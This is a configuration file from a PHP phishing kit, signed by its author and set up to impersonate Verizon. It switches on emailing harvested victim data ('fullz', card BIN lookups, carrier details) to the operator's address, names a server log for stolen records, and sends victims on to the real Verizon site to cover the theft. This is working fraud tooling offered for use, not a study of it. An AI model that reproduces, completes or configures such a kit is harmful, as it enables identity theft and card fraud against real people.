<?php
/*
* Scampage by CaliBugga
* Jabber: lauriemoore302@jabba.im
* ICQ: xxxxxxxxx
*/
//Systems:

// - Carrier lookup in results (Already activated)
// - Bin List (Change '0' from $binList to '1' to activate)
// - Send results via email (Change '0' from $sendEmail to '1' to activate)
// - Save results on server (Change '0' from $saveFile to '1' to activate) => assets/logs/fullz.txt
// - Save results in separated files clased by BIN (Change '0' from $binSave to '1' to activate)


$saveFile = 0;
$sendEmail = 1;
$binList = 0;
$binSave = 0;

$to = 'caliroken@protonmail.com';
$ExitLink = "https://www.verizon.com/"; // Real site via google redirect

?>